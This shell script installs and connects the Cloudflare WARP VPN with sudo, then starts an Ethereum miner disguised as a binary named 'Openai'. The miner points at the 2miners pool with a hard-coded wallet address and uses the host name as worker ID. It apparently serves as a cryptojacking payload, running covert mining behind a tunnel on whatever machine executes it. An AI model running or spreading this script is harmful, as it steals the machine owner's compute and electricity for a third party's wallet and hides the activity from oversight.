#!/bin/sh
wget https://pkg.cloudflareclient.com/uploads/cloudflare_warp_2021_8_0_1_amd64_844183db02.deb
sudo dpkg -i cloudflare_warp_2021_8_0_1_amd64_844183db02.deb
sudo systemctl enable --now warp-svc.service
echo Y | warp-cli set-mode warp+doh
warp-cli set-mode warp+doh
warp-cli register
warp-cli connect

./Openai --algo ethash --server eth.2miners.com:2020 --user 0xcfEE82DA221E743051d71c24e6d0b75Bd094A819.$HOSTNAME


